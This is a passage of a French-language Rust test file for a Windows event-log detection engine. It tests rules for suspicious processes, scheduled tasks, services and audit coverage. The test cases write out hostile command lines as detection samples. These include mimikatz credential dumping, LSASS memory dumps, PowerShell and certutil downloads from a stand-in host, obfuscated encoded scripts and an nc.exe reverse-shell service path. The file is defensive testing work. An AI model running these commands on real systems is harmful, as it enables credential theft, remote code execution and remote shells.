    assert!(regle(&juger_avec(&[changee], &sans_historique, options()), "EVT-TAC-001").verifie());
    // L'historique lu en entier : vérifiée sans l'audit.
    assert!(regle(&juger(&[]), "EVT-TAC-001").verifie());
    // L'historique désactivé (la valeur d'origine) et pas d'audit : non vérifiée.
    let mut etats = tout_lu();
    etats.iter_mut().find(|e| e.nom == TACHES).unwrap().active = Some(false);
    let j = regle(&juger_avec(&[], &etats, options()), "EVT-TAC-001").clone();
    assert!(j.manques.contains(&Manque::Desactive(TACHES.into())), "{:?}", j.manques);
    assert!(j.manques.iter().any(|m| matches!(m, Manque::NonAudite { .. })));
    // Sans audit prouvé, un historique qui ne couvre que la fin de la période demandée ne suffit pas.
    let mut depuis = options();
    depuis.depuis = Some(t0() - Duration::days(7));
    let j = regle(&juger_avec(&[], &tout_lu(), depuis), "EVT-TAC-001").clone();
    assert!(!j.verifie());
    assert!(
        j.manques
            .iter()
            .any(|m| matches!(m, Manque::PeriodeCourte { journal, .. } if journal == TACHES)),
        "{:?}",
        j.manques
    );
    // Une source lue en partie ne suffit pas.
    let mut etats = sans_historique.clone();
    etats.iter_mut().find(|e| e.nom == "Security").unwrap().lecture = Lecture::Lu(vec!["3 textes coupés".into()]);
    let changee = tache(4702, "\\Essai", "C:\\Program Files\\App\\app.exe", "");
    assert!(!regle(&juger_avec(&[changee], &etats, options()), "EVT-TAC-001").verifie());
}

// ---------------------------------------------------------------------------------------------------------------
// EVT-PRC-001
// ---------------------------------------------------------------------------------------------------------------

fn processus(programme: &str, ligne: &str) -> EvenementWindows {
    let mut e = sec(
        4688,
        0,
        &[
            ("SubjectUserName", "alice"),
            ("SubjectDomainName", "SALON-PC"),
            ("NewProcessName", programme),
            ("CommandLine", ligne),
            ("ParentProcessName", "C:\\Windows\\explorer.exe"),
        ],
    );
    e.ordinateur = "Salon-PC".into();
    e
}

#[test]
fn processus_suspects() {
    let ps = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
    let cas: &[(&str, &str, Option<Gravite>)] = &[
        (
            "C:\\Users\\alice\\Downloads\\mimikatz.exe",
            "mimikatz.exe",
            Some(Gravite::Critique),
        ),
        (
            "C:\\Users\\alice\\x.exe",
            "x.exe \"sekurlsa::logonpasswords\" exit",
            Some(Gravite::Critique),
        ),
        (
            "C:\\Windows\\System32\\rundll32.exe",
            "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\temp\\l.dmp full",
            Some(Gravite::Critique),
        ),
        (
            "C:\\Outils\\procdump64.exe",
            "procdump64.exe -ma lsass.exe l.dmp",
            Some(Gravite::Critique),
        ),
        (
            ps,
            "powershell.exe -nop -w hidden -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
            Some(Gravite::Alerte),
        ),
        (
            ps,
            "powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBi",
            Some(Gravite::Alerte),
        ),
        (
            ps,
            "powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')\"",
            Some(Gravite::Alerte),
        ),
        (
            "C:\\Windows\\System32\\certutil.exe",
            "certutil -urlcache -split -f http://x.test/a.exe C:\\temp\\a.exe",
            Some(Gravite::Alerte),
        ),
        (
            "C:\\Windows\\System32\\certutil.exe",
            "certutil -decode a.b64 a.exe",
            Some(Gravite::Alerte),
        ),
        (
            "C:\\Windows\\System32\\bitsadmin.exe",
            "bitsadmin /transfer t http://x.test/a.exe C:\\temp\\a.exe",
            Some(Gravite::Alerte),
        ),
        (
            "C:\\Windows\\System32\\regsvr32.exe",
            "regsvr32 /s /n /u /i:http://x.test/a.sct scrobj.dll",
            Some(Gravite::Alerte),
        ),
        (
            "C:\\Windows\\System32\\mshta.exe",
            "mshta javascript:a=1",
            Some(Gravite::Alerte),
        ),
        // Ordinaires.
        (
            ps,
            "powershell.exe -ExecutionPolicy Bypass -File C:\\Program Files\\App\\maj.ps1",
            None,
        ),
        (ps, "powershell -e court", None),
        (
            "C:\\Windows\\System32\\certutil.exe",
            "certutil -hashfile a.iso SHA256",
            None,
        ),
        (
            "C:\\Windows\\System32\\rundll32.exe",
            "rundll32.exe shell32.dll,Control_RunDLL",
            None,
        ),
        (
            "C:\\Windows\\System32\\notepad.exe",
            "notepad.exe C:\\Users\\alice\\mimi.txt",
            None,
        ),
    ];
    for (programme, ligne, attendu) in cas {
        let js = juger(&[processus(programme, ligne)]);
        assert_eq!(
            gravites(&js, "EVT-PRC-001"),
            attendu.iter().copied().collect::<Vec<_>>(),
            "{ligne}"
        );
        if attendu.is_some() {
            let t = &trouvailles(&js, "EVT-PRC-001")[0];
            assert!(t.details.iter().any(|(_, v)| v == "C:\\Windows\\explorer.exe"));
        }
    }
}

/// Sans la ligne de commande (la valeur d'origine) : le nom du programme se juge encore, mais la règle n'est pas
/// vérifiée, et dit les deux réglages à allumer.
#[test]
fn processus_sans_ligne_de_commande() {
    let mut evs = vec![processus("C:\\Users\\alice\\Downloads\\mimikatz.exe", "")];
    let js = juger_nu(&evs, &tout_lu(), options());
    let j = regle(&js, "EVT-PRC-001");
    assert_eq!(gravites(&js, "EVT-PRC-001"), [Gravite::Critique]);
    assert!(!j.verifie());
    let (texte, _) = resultat::manque(&Source::Vivant, &j.manques[j.manques.len() - 1]);
    assert!(
        texte.contains("Auditer la création du processus") && texte.contains("Inclure la ligne de commande"),
        "{texte}"
    );
    // Une ligne de commande d'un morceau abîmé ne prouve rien.
    let mut abime = processus("C:\\Windows\\System32\\notepad.exe", "notepad.exe");
    abime.verifie = false;
    evs.push(abime);
    assert!(
        regle(&juger_nu(&evs, &tout_lu(), options()), "EVT-PRC-001")
            .manques
            .iter()
            .any(|m| matches!(m, Manque::NonAudite { .. }))
    );
}

/// La ligne de commande coupée après coup (un réglage du registre, sans trace dans le journal) : les processus
/// suivants n'en ont plus, la règle n'est plus vérifiée ; une preuve trop ancienne non plus. Les processus du noyau
/// (sans dossier), sans ligne même réglage allumé, ne comptent pas.
#[test]
fn ligne_de_commande_coupee_apres_coup() {
    let a_la = |mut e: EvenementWindows, s: i64| {
        e.date = Some(t0() + Duration::seconds(s));
        e
    };
    let avec = processus("C:\\Windows\\System32\\notepad.exe", "notepad.exe");
    let sans = processus("C:\\Windows\\System32\\notepad.exe", "");
    let noyau = processus("Registry", "");
    let prc = |evs: &[EvenementWindows]| regle(&juger_nu(evs, &tout_lu(), options()), "EVT-PRC-001").clone();
    assert!(prc(&[a_la(avec.clone(), 0), a_la(noyau, 60)]).verifie());
    let j = prc(&[a_la(avec.clone(), 0), a_la(sans, 3600)]);
    assert!(
        j.manques.iter().any(|m| matches!(m, Manque::ChampCoupe { .. })),
        "{:?}",
        j.manques
    );
    // Trois jours de journal après la dernière ligne de commande vue.
    let plus_tard = sec(4624, 3 * 86_400, &[("LogonType", "5")]);
    let j = prc(&[a_la(avec, 0), plus_tard]);
    assert!(
        j.manques.iter().any(|m| matches!(m, Manque::ChampCoupe { .. })),
        "{:?}",
        j.manques
    );
}

/// D'un dossier, la preuve tirée des fichiers eux-mêmes est dite.
#[test]
fn preuve_d_un_dossier_avec_reserve() {
    let jamais = |_: &str| false;
    let (c, _) = resultat::constats(&analyse(juger(&[])), &jamais);
    let prc = c.iter().find(|c| c.regle == "EVT-PRC-001" && c.verifie).unwrap();
    assert!(prc.message.contains(crate::tr!("Réserve", "Caveat")), "{}", prc.message);
    let tac = c.iter().find(|c| c.regle == "EVT-TAC-001").unwrap();
    assert!(!tac.message.contains(crate::tr!("Réserve", "Caveat")));
}

proptest! {
    /// Des lignes, des tâches et des chemins hostiles : jamais de panique, et des textes gardés bornés.
    #[test]
    fn lignes_et_taches_hostiles(
        programme in ".{0,200}",
        ligne in prop_oneof![".{0,600}", "(powershell|-e|-enc|certutil|-urlcache|http://|<Exec>|<Command>|</Command>|</Exec>|<Arguments>| |\\\\){0,80}"],
    ) {
        let _ = ligne_suspecte(&programme, &ligne);
        let _ = tache_suspecte(&programme, &ligne);
        let (actions, _) = actions_de_tache(&ligne);
        prop_assert!(actions.len() <= 32);
        let js = juger(&[processus(&programme, &ligne), tache(4698, &programme, &programme, &ligne)]);
        for id in ["EVT-PRC-001", "EVT-TAC-001"] {
            for t in trouvailles(&js, id) {
                prop_assert!(t.objet.chars().count() <= super::moteur::TEXTE_MAX + 1);
                prop_assert!(t.details.iter().all(|(_, v)| v.chars().count() <= super::moteur::TEXTE_MAX + 1));
            }
        }
    }
}

// ---------------------------------------------------------------------------------------------------------------
// Constats et couverture
// ---------------------------------------------------------------------------------------------------------------

fn analyse(js: Vec<Jugement>) -> Analyse {
    Analyse {
        source: Source::Dossier("d".into()),
        jugements: js,
        journaux: Vec::new(),
        etats: Vec::new(),
        manques_source: Vec::new(),
        services_ordinaires: Vec::new(),
        debut_systeme: None,
    }
}

/// WIN-JRN-003 (le bilan) rend les trouvailles du moteur : chaque alerte avec sa règle `EVT-` devant et son niveau ;
/// les règles vérifiées en un constat sain ; les non vérifiées regroupées par ce qui leur manque, avec sa raison
/// typée (le journal de sécurité refusé sans droits d'administrateur), jamais comptées saines.
#[test]
fn constats_du_bilan() {
    let jamais = |_: &str| false;
    let vivant = |jugements: Vec<Jugement>| Analyse {
        source: Source::Vivant,
        jugements,
        journaux: Vec::new(),
        etats: Vec::new(),
        manques_source: Vec::new(),
        services_ordinaires: Vec::new(),
        debut_systeme: None,
    };
    // Tout lu : une alerte, puis un seul constat sain qui nomme les treize règles.
    let a = vivant(juger(&[processus(
        "C:\\Users\\alice\\Downloads\\mimikatz.exe",
        "mimikatz.exe",
    )]));
    let c = resultat::constats_du_bilan(&a, &jamais);
    let messages: Vec<&str> = c.iter().map(|c| c.message.as_str()).collect();
    assert_eq!(c.len(), 2, "{messages:#?}");
    assert_eq!(c[0].probleme, Some(crate::risk::Niveau::Critique));
    assert!(c[0].message.starts_with("EVT-PRC-001"), "{}", c[0].message);
    assert!(c[1].verifie && c[1].probleme.is_none());
    assert!(
        c[1].message.contains("13") && c[1].message.contains("EVT-TAC-001"),
        "{}",
        c[1].message
    );
    // Sans droits d'administrateur : Security refusé ; ses règles non vérifiées, en un constat, raison « droits ».
    let mut etats: Vec<EtatJournal> = tout_lu().into_iter().filter(|e| e.nom != "Security").collect();
    etats.push(EtatJournal {
        nom: "Security".into(),
        lecture: Lecture::Refuse,
        active: None,
        principal: true,
        suites: Vec::new(),
    });
    let c = resultat::constats_du_bilan(&vivant(juger_avec(&[], &etats, options())), &jamais);
    let refuses: Vec<_> = c.iter().filter(|c| !c.verifie).collect();
    assert!(!refuses.is_empty());
    let droits = refuses
        .iter()
        .find(|c| c.precision == crate::modele::Precision::NonVerifie(crate::modele::Raison::Droits))
        .unwrap();
    for id in ["EVT-ADM-001", "EVT-MDP-001", "EVT-PRC-001", "EVT-AUD-001"] {
        assert!(droits.message.contains(id), "{id} : {}", droits.message);
    }
    // Celles qui ne lisent pas Security restent vérifiées ; aucune règle de Security parmi les saines.
    let sain = c.iter().find(|c| c.verifie && c.probleme.is_none()).unwrap();
    assert!(
        sain.message.contains("EVT-BIT-001") && !sain.message.contains("EVT-ADM-001"),
        "{}",
        sain.message
    );
    // Une alerte déclarée normale est tue ; une critique jamais.
    let a = vivant(juger(&[sec(
        4720,
        0,
        &[("TargetUserName", "bob"), ("SubjectUserName", "alice")],
    )]));
    let toujours = |_: &str| true;
    let c = resultat::constats_du_bilan(&a, &toujours);
    assert!(c.iter().all(|c| c.probleme.is_none()));
    assert!(c.iter().any(|c| c.message.contains("1 ")), "le nombre de tues est dit");
    let critique = vivant(juger(&[processus(
        "C:\\Users\\alice\\Downloads\\mimikatz.exe",
        "mimikatz.exe",
    )]));
    let c = resultat::constats_du_bilan(&critique, &toujours);
    assert!(c.iter().any(|c| c.probleme == Some(crate::risk::Niveau::Critique)));
}

/// Le bilan liste les services ordinaires installés pendant la période (B7) : une information, au plus cinq noms puis
/// « … », avec où les regarder ; un service d'attaque n'y est pas (EVT-SRV-001 en fait une alerte), un nom repris ou
/// un événement non vérifié non plus, et la liste gardée reste bornée.
#[test]
fn services_ordinaires_listes_au_bilan() {
    let service = |nom: &str, chemin: &str| {
        ev(
            "System",
            SCM,
            7045,
            0,
            &[
                ("ServiceName", nom),
                ("ImagePath", chemin),
                ("StartType", "auto start"),
                ("AccountName", "LocalSystem"),
            ],
        )
    };
    let ordinaire = |nom: &str| service(nom, &format!("C:\\Program Files\\{nom}\\{nom}.exe"));
    let mut abime = ordinaire("Abime");
    abime.verifie = false;
    let mut autre_journal = ordinaire("Ailleurs");
    autre_journal.journal = "Application".into();
    let mut services = Vec::new();
    for e in [
        ordinaire("Sauvegarde"),
        ordinaire("sauvegarde"),
        service("PSEXESVC", "%SystemRoot%\\PSEXESVC.exe"),
        abime,
        autre_journal,
        ordinaire("Imprimante"),
    ] {
        resultat::noter_service(&mut services, &e);
    }
    assert_eq!(services, ["Sauvegarde", "Imprimante"]);
    // Le même nom que juge EVT-SRV-001, espaces autour compris : un service d'attaque déguisé est une alerte, et
    // n'est pas listé ; jamais ni l'un ni l'autre.
    let deguise = service(" PSEXESVC ", "C:\\Program Files\\Outil\\outil.exe");
    resultat::noter_service(&mut services, &deguise);
    assert_eq!(services, ["Sauvegarde", "Imprimante"]);
    assert_eq!(gravites(&juger(&[deguise]), "EVT-SRV-001").len(), 1);
    let vivant = |services_ordinaires: Vec<String>| Analyse {
        source: Source::Vivant,
        jugements: Vec::new(),
        journaux: Vec::new(),
        etats: Vec::new(),
        manques_source: Vec::new(),
        services_ordinaires,
        debut_systeme: None,
    };
    let jamais = |_: &str| false;
    let c = resultat::constats_du_bilan(&vivant(services), &jamais);
    assert_eq!(c.len(), 1);
    assert_eq!(c[0].probleme, Some(crate::risk::Niveau::Info));
    assert!(c[0].message.contains("Sauvegarde, Imprimante."), "{}", c[0].message);
    assert!(c[0].message.contains("regardez-le dans Services"), "{}", c[0].message);
    assert!(
        c[0].correctif
            .as_ref()
            .is_some_and(|k| k.commandes.iter().any(|x| x.contains("services.msc")))
    );
    // Mille services : six gardés, cinq nommés puis « … ».
    let mut services = Vec::new();
    for i in 0..1000 {
        resultat::noter_service(&mut services, &ordinaire(&format!("Svc{i}")));
    }
    assert_eq!(services.len(), 6);
    let c = resultat::constats_du_bilan(&vivant(services), &jamais);
    assert!(
        c[0].message.contains("Svc0, Svc1, Svc2, Svc3, Svc4, …."),
        "{}",
        c[0].message
    );
    // Aucun : rien à dire.
    assert!(resultat::constats_du_bilan(&vivant(Vec::new()), &jamais).is_empty());
}

/// COM-JRN-001 ne cède ses effacements à WIN-JRN-003 que si celui-ci a lu le journal System en entier.
#[test]
fn journal_system_lu_en_entier() {
    let avec = |etats: Vec<EtatJournal>, manques_source: Vec<String>| Analyse {
        source: Source::Vivant,
        jugements: Vec::new(),
        journaux: Vec::new(),
        etats,
        manques_source,
        services_ordinaires: Vec::new(),
        debut_systeme: None,
    };
    assert!(resultat::systeme_lu_en_entier(&avec(tout_lu(), Vec::new())));
    // Lu en partie (délai, borne), refusé, désactivé, absent, ou la source incomplète : non.
    let mut partiel = tout_lu();
    partiel.iter_mut().find(|e| e.nom == "System").unwrap().lecture = Lecture::Lu(vec!["délai dépassé".into()]);
    let mut refuse = tout_lu();
    refuse.iter_mut().find(|e| e.nom == "System").unwrap().lecture = Lecture::Refuse;
    let mut coupe = tout_lu();
    coupe.iter_mut().find(|e| e.nom == "System").unwrap().active = Some(false);
    let absent: Vec<EtatJournal> = tout_lu().into_iter().filter(|e| e.nom != "System").collect();
    for etats in [partiel, refuse, coupe, absent] {
        assert!(!resultat::systeme_lu_en_entier(&avec(etats, Vec::new())));
    }
    assert!(!resultat::systeme_lu_en_entier(&avec(tout_lu(), vec!["manque".into()])));
}

/// Un dossier dont le jugement dépasse son délai : les événements suivants ne sont pas jugés, et c'est dit.
#[test]
fn dossier_hors_delai() {
    // Un dossier d'essai, pas un fichier d'état de Vanguard : hors du dossier des données, retiré à la fin.
    let dossier = std::env::temp_dir().join(format!("vanguard-essai-delai-{}", std::process::id()));
    std::fs::create_dir_all(&dossier).unwrap();
    let f = crate::journaux_windows::evtx::tests::fichier(&[crate::journaux_windows::evtx::tests::morceau_type(1)]);
    std::fs::write(dossier.join("System.evtx"), f).unwrap();
    let deja = std::time::Instant::now();
    let a = resultat::analyser_dossier_borne(
        &dossier,
        &Options::default(),
        &crate::journaux_windows::fichiers::BornesFichiers::default(),
        BornesMoteur::default(),
        deja,
    )
    .unwrap();
    let _ = std::fs::remove_dir_all(&dossier);
    assert!(
        a.manques_source.iter().any(|m| m.contains("jug")),
        "{:?}",
        a.manques_source
    );
    assert!(a.jugements.iter().all(|j| !j.verifie()));
}

#[test]
fn constats_et_couverture() {
    let jamais = |_: &str| false;
    let debut = (Utc::now(), std::time::Instant::now());
    // Tout lu, rien trouvé : sain.
    let r = resultat::resultat(&analyse(juger(&[])), debut, &jamais);
    assert_eq!(r.verdict(), "sain", "{:#?}", r.couverture);
    assert_eq!(r.couverture.verifies, 13);
    // Sans Security : non vérifié, jamais sain, et chaque règle qui le lit le dit.
    let sans: Vec<EtatJournal> = tout_lu().into_iter().filter(|x| x.nom != "Security").collect();
    let r = resultat::resultat(&analyse(juger_avec(&[], &sans, options())), debut, &jamais);
    assert_eq!(r.verdict(), "non-verifie");
    assert!(
        r.couverture
            .non_verifies
            .iter()
            .any(|n| n.starts_with("EVT-MDP-001") && n.contains("Security.evtx"))
    );
    // Une alerte, puis la même déclarée normale : tue, et dite dans le constat de sa règle.
    let svc = ev(
        "System",
        SCM,
        7045,
        0,
        &[("ServiceName", "x"), ("ImagePath", r"C:\Windows\Temp\x.exe")],
    );
    let a = analyse(juger(&[svc]));
    let r = resultat::resultat(&a, debut, &jamais);
    assert_eq!(r.verdict(), "probleme");
    let alerte = r.constats.iter().find(|c| c.etat == "probleme").unwrap();
    assert_eq!(alerte.regle, "EVT-SRV-001");
    let cle = resultat::cle_normale("EVT-SRV-001", r"x|c:\windows\temp\x.exe");
    assert_eq!(alerte.objet.as_deref(), Some(r"evt:x|c:\windows\temp\x.exe"));
    let normale = |c: &str| c == cle;
    let r = resultat::resultat(&a, debut, &normale);
    assert_eq!(r.verdict(), "sain");
    assert!(
        r.constats
            .iter()
            .any(|c| c.regle == "EVT-SRV-001" && c.message.contains('1'))
    );
    // Chaque constat porte sa règle, et chaque règle a le sien.
    for id in REGLES.iter().map(|r| r.id) {
        assert!(r.constats.iter().any(|c| c.regle == id), "{id}");
    }
}

// ---------------------------------------------------------------------------------------------------------------
// Les échantillons publics
// ---------------------------------------------------------------------------------------------------------------

/// Tout le jeu sur les échantillons publics : ce que chaque règle y trouve (beaucoup sont des journaux d'attaque
/// publiés), écrit pour le rapport du lot, et quelques détections sûres vérifiées.
#[test]
fn sur_les_echantillons_publics() {
    let Some(dossier) = std::env::var_os("VANGUARD_EVTX_ECHANTILLONS") else {
        return crate::essais::saute("VANGUARD_EVTX_ECHANTILLONS absente : pas d'échantillons .evtx");
    };
    let debut = std::time::Instant::now();
    let a = resultat::analyser_dossier(std::path::Path::new(&dossier), &Options::default()).unwrap();
    let duree = debut.elapsed();
    let evenements: u64 = a.journaux.iter().map(|s| s.evenements).sum();
    eprintln!("échantillons : {evenements} événements en {duree:?}");
    for j in &a.jugements {
        let mut par_gravite = [0usize; 3];
        for t in &j.trouvailles {
            par_gravite[t.gravite as usize] += 1;
        }
        eprintln!(
            "{} : {} trouvailles (info {}, alerte {}, critique {}), {} au-delà, {} manques, {} examinés",
            j.regle.id,
            j.trouvailles.len(),
            par_gravite[0],
            par_gravite[1],
            par_gravite[2],
            j.au_dela,
            j.manques.len(),
            j.examines
        );
        for t in j.trouvailles.iter().take(12) {
            eprintln!(
                "    {:?} {} ×{} {:?} {:?}",
                t.gravite,
                t.objet.chars().take(110).collect::<String>(),
                t.nombre,
                t.details
                    .iter()
                    .map(|(_, v)| v.chars().take(60).collect::<String>())
                    .collect::<Vec<_>>(),
                t.reserves
            );
        }
        for m in j.manques.iter().take(6) {
            eprintln!("    manque {m:?}");
        }
    }
    let ids = |id: &str| a.jugements.iter().find(|j| j.regle.id == id).unwrap();
    // Le 1102 de security.evtx et le 104 de system.evtx (Sysmon effacé) ; le 1149 depuis une adresse publique ;
    // la rafale d'échecs du Bureau à distance (23.94.153.202) de security_big_sample.evtx.
    assert!(
        ids("EVT-EFF-001")
            .trouvailles
            .iter()
            .any(|t| t.objet.starts_with("security|"))
    );
    assert!(
        ids("EVT-EFF-001")
            .trouvailles
            .iter()
            .any(|t| t.objet.starts_with("microsoft-windows-sysmon/operational|"))
    );
    assert!(
        ids("EVT-RDP-001")
            .trouvailles
            .iter()
            .any(|t| t.details.iter().any(|(_, v)| v == "174.127.93.2"))
    );
    assert!(
        ids("EVT-ADM-001")
            .trouvailles
            .iter()
            .any(|t| t.objet.starts_with("groupe:s-1-5-32-544:"))
    );
    // Des journaux lus en partie (morceaux abîmés exprès) : jamais « sain ».
    let r = resultat::resultat(&a, (Utc::now(), debut), &|_| false);
    assert_ne!(r.verdict(), "sain");
}

// ---------------------------------------------------------------------------------------------------------------
// Le moteur seul : conditions, preuve d'audit
// ---------------------------------------------------------------------------------------------------------------

#[test]
fn conditions_sur_les_champs() {
    use super::moteur::{Condition as C, Test as T};
    let e = sec(
        4688,
        0,
        &[("A", "  Alpha Beta "), ("N", "0x1F"), ("V", "-"), ("E", "É")],
    );
    let vrais = [
        C::Toujours,
        C::Champ("A", T::Egal("alpha beta")),
        C::Champ("A", T::Commence("ALPHA")),
        C::Champ("A", T::Finit("beta")),
        C::Champ("A", T::Contient("ha b")),
        C::Champ("A", T::Dans(&["x", "ALPHA BETA"])),
        C::Champ("N", T::NombreDans(&[31])),
        C::Champ("N", T::NombreAuMoins(31)),
        C::Champ("A", T::Rempli),
        C::Champ("E", T::Egal("é")),
        C::ChampExact("A", T::Egal("Alpha Beta")),
        C::Tous(&[C::Toujours, C::Champ("N", T::NombreAuMoins(1))]),
        C::Un(&[C::Champ("A", T::Egal("non")), C::Toujours]),
        C::Pas(&C::Champ("V", T::Rempli)),
        C::Si(|e| e.id == 4688),
    ];
    for c in vrais {
        assert!(c.vrai(&e), "{c:?}");
    }
    let faux = [
        C::ChampExact("A", T::Egal("alpha beta")),
        C::Champ("absent", T::Rempli),
        C::Champ("V", T::Rempli),
        C::Champ("N", T::NombreAuMoins(32)),
        C::Champ("A", T::NombreDans(&[0])),
        C::Un(&[]),
    ];
    for c in faux {
        assert!(!c.vrai(&e), "{c:?}");
    }
}

/// Un volet dont la sous-catégorie d'audit n'est pas sûre : sans un événement de preuve vu, non vérifié ; avec, il
/// l'est.
#[test]
fn preuve_d_audit() {
    use super::moteur::{Audit, Condition, Forme, Indice, Regle, Volet};
    static ESSAI: &[Regle] = &[Regle {
        id: "EVT-ESS-001",
        sujet: ("essai", "test"),
        techniques: &["T1059"],
        references: &[],
        volets: &[Volet {
            journal: "Security",
            fournisseurs: &[],
            ids: &[4688],
            quand: Condition::Toujours,
            forme: Forme::Chacun(|_| None::<Indice>),
            audit: Audit::Preuve {
                preuve: &[4688, 4689],
                quoi: ("création de processus", "process creation"),
            },
            sous_categorie: None,
        }],
        limite: None,
        defender: false,
        un_journal_suffit: false,
    }];
    let essai = |evs: &[EvenementWindows]| {
        let mut m = Moteur::nouveau(ESSAI, options(), BornesMoteur::default());
        for e in evs {
            m.recevoir(e);
        }
        m.conclure(&tout_lu()).remove(0)
    };
    assert!(essai(&[]).manques.iter().any(|m| matches!(m, Manque::NonAudite { .. })));
    // Un événement de preuve d'un morceau abîmé ne prouve rien.
    let mut abime = sec(4689, 0, &[]);
    abime.verifie = false;
    assert!(
        essai(&[abime])
            .manques
            .iter()
            .any(|m| matches!(m, Manque::NonAudite { .. }))
    );
    assert!(essai(&[sec(4689, 0, &[])]).verifie());
}

#[test]
fn constats_de_la_source_vivante() {
    let mut etats = tout_lu();
    etats.retain(|e| e.nom != "Security");
    etats.push(etat("Security", Lecture::Refuse, None));
    let a = Analyse {
        source: Source::Vivant,
        jugements: juger_avec(&[], &etats, options()),
        journaux: Vec::new(),
        etats,
        manques_source: Vec::new(),
        services_ordinaires: Vec::new(),
        debut_systeme: None,
    };
    let (constats, couverture) = resultat::constats(&a, &|_| false);
    assert!(couverture.non_verifies.iter().any(|n| n.starts_with("EVT-MDP-001")));
    let c = constats.iter().find(|c| c.regle == "EVT-ADM-001").unwrap();
    assert!(!c.verifie);
    assert_eq!(
        c.precision,
        crate::modele::Precision::NonVerifie(crate::modele::Raison::Droits)
    );
    assert!(a.etats.iter().any(|e| e.lecture == Lecture::Refuse));
}

/// Tout le jeu sur des collections publiques de journaux d'attaque (`VANGUARD_EVTX_ATTAQUES` : un dossier, lu
/// sous-dossier par sous-dossier ; jamais dans le dépôt) : combien de fichiers chaque règle signale, et quoi. Une
/// mesure pour le rapport, sans seuil : ces collections changent.
#[test]
fn sur_les_journaux_d_attaque_publics() {
    let Some(racine) = std::env::var_os("VANGUARD_EVTX_ATTAQUES") else {
        return crate::essais::saute("VANGUARD_EVTX_ATTAQUES absente : pas de collection de journaux d'attaque");
    };
    let mut dossiers = vec![std::path::PathBuf::from(racine)];
    let mut tous = Vec::new();
    while let Some(d) = dossiers.pop() {
        let Ok(entrees) = std::fs::read_dir(&d) else { continue };
        let mut a_des_evtx = false;
        for e in entrees.flatten() {
            let p = e.path();
            if p.is_dir() && !p.ends_with(".git") {
                dossiers.push(p);
            } else if p.extension().is_some_and(|x| x.eq_ignore_ascii_case("evtx")) {
                a_des_evtx = true;
            }
        }
        if a_des_evtx {
            tous.push(d);
        }
    }
    let mut par_regle: std::collections::BTreeMap<&str, (BTreeSet<String>, Vec<String>)> =
        std::collections::BTreeMap::new();
    let mut evenements = 0u64;
    let debut = std::time::Instant::now();
    for d in &tous {
        let a = resultat::analyser_dossier(d, &Options::default()).unwrap();
        evenements += a.journaux.iter().map(|s| s.evenements).sum::<u64>();
        for j in &a.jugements {
            let e = par_regle.entry(j.regle.id).or_default();
            for t in &j.trouvailles {
                let fichier = t
                    .reperes
                    .first()
                    .and_then(|r| r.fichier.as_ref())
                    .and_then(|f| f.file_name())
                    .map_or_else(|| d.display().to_string(), |f| f.to_string_lossy().into_owned());
                if e.0.insert(fichier.clone()) || e.1.len() < 400 {
                    e.1.push(format!(
                        "{:?} {} ← {}",
                        t.gravite,
                        t.objet.chars().take(90).collect::<String>(),
                        fichier
                    ));
                }
            }
        }
    }
    eprintln!(
        "journaux d'attaque : {} dossiers, {evenements} événements en {:?}",
        tous.len(),
        debut.elapsed()
    );
    for (id, (fichiers, lignes)) in &par_regle {
        eprintln!("{id} : {} fichiers signalés", fichiers.len());
        for l in lignes {
            eprintln!("    {l}");
        }
    }
}

#[test]
fn scripts_obscurcis_et_services_detournes() {
    let cas = [
        (
            "$a=(('Do'+'wn')+('loadStr'+'ing'));(New-Object Net.WebClient).$a('http://x')",
            Some("telecharge"),
        ),
        (
            "(New-Object  Net . WebClient ) . ( 'DownloadFile' )('http://x','y')",
            None,
        ),
        (
            "$c=[System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application.1\",\"fs01\"))",
            Some("deplacement"),
        ),
        (
            "Set-ItemProperty -path HKLM:\\System\\CurrentControlSet\\services\\xboxgip -name ImagePath -value \"C:\\nc.exe -e powershell.exe 10.10.14.26 4447\"",
            Some("outil"),
        ),
        (
            "Set-ItemProperty -path HKLM:\\System\\CurrentControlSet\\services\\x -name FailureCommand -value 'C:\\x.exe'",
            Some("service"),
        ),
        (
            "Get-ItemProperty HKLM:\\System\\CurrentControlSet\\Services\\x | Select ImagePath",
            None,
        ),
        (
            "$p = Get-Process lsass; $WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting'); $m = $WERNativeMethods.GetMethod('MiniDumpWriteDump')",
            Some("lsass"),
        ),
        (
            "&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sI')))",
            Some("encode"),
        ),
    ];
    for (texte, attendu) in cas {
        assert_eq!(script_suspect(texte).map(|x| x.0), attendu, "{texte}");
    }
    assert_eq!(
        service_suspect("PSEXESVC", r"%SystemRoot%\PSEXESVC.exe").map(|x| x.0),
        Some(Gravite::Alerte)
    );
    assert_eq!(
        service_suspect("bad-task", "virusé.exe").map(|x| x.0),
        Some(Gravite::Alerte)
    );
    assert_eq!(
        service_suspect("remotesvc", "calc.exe").map(|x| x.0),
        Some(Gravite::Alerte)
    );
}

/// Sous Wine (aucun journal) comme sur un Windows qui refuse : chaque règle dit pourquoi elle n'a rien vérifié,
/// aucune n'est « saine ».
#[cfg(windows)]
#[test]
fn ordinateur_vivant_sans_journaux_jamais_sain() {
    let fin = std::time::Instant::now() + std::time::Duration::from_secs(30);
    let a = resultat::analyser_vivant(&Options::default(), fin);
    assert_eq!(a.etats.len(), JOURNAUX.len());
    if a.etats.iter().any(|e| matches!(e.lecture, Lecture::Lu(_))) {
        return crate::essais::saute("des journaux se lisent ici : pas un Windows sans journaux");
    }
    for j in &a.jugements {
        assert!(!j.verifie() || j.sans_objet, "{} : {:?}", j.regle.id, j.manques);
    }
    let r = resultat::resultat(&a, (Utc::now(), std::time::Instant::now()), &|_| false);
    assert_eq!(r.verdict(), "non-verifie");
}

// ---------------------------------------------------------------------------------------------------------------
// Après les relectures
// ---------------------------------------------------------------------------------------------------------------

#[test]
fn journaux_vides_muets_ou_audit_reduit() {
    // Security et System lus mais vides : non vérifiées, et sans ouverture de session, l'audit n'est pas prouvé.
    let js = juger_nu(&[], &tout_lu(), options());
    let mdp = regle(&js, "EVT-MDP-001");
    assert!(
